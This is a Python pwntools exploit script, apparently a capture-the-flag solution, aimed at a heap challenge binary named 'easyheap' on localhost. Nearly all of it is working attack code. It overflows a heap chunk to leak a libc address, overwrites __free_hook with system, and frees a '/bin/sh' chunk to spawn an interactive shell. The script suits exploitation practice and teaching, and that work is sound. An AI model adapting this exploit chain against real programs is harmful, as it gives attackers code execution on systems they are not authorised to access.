#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./easyheap", env = {"LD_PRELOAD": "./libc.so.6"})
    #  io = process("")

else:
    io = remote("localhost", 9999)

elf = ELF("./easyheap") 
libc = ELF("./libc.so.6")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)


def create(size, content):
    io.sendlineafter("Choice:", "1")
    io.sendlineafter("Size:", str(size))
    io.sendlineafter("Content:\n", content)

def edit(idx, size, content):
    io.sendlineafter("Choice:", "2")
    io.sendlineafter("id:", str(idx))
    io.sendlineafter("Size:", str(size))
    io.sendlineafter("Content:\n", content)

def list():
    io.sendlineafter("Choice:", "3")

def remove(idx):
    io.sendlineafter("Choice:", "4")
    io.sendlineafter("id:", str(idx))

if __name__ == "__main__":
    create(0x10, "123")
    create(0x10, "123")
    create(0x300, "123")
    create(0x10, "123")

    remove(2)
    payload = cyclic(0x20) + p64(0x100) + "\xb0"
    edit(0, 100, payload)

    list()
    io.recvuntil("content:")
    io.recvuntil("content:")

    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00")) - 0x3c4b78
    success("libcBase -> {:#x}".format(libcBase))
    pause()

    systemAddr = libcBase + libc.symbols["system"]
    freeHook = libcBase + libc.symbols["__free_hook"]

    payload = cyclic(0x20) + p64(0x100) + p64(freeHook)
    edit(0, 100, payload)
    edit(1, 100, p64(systemAddr))
    create(0x20, "/bin/sh\x00")

    remove(2)

    io.interactive()
    io.close()
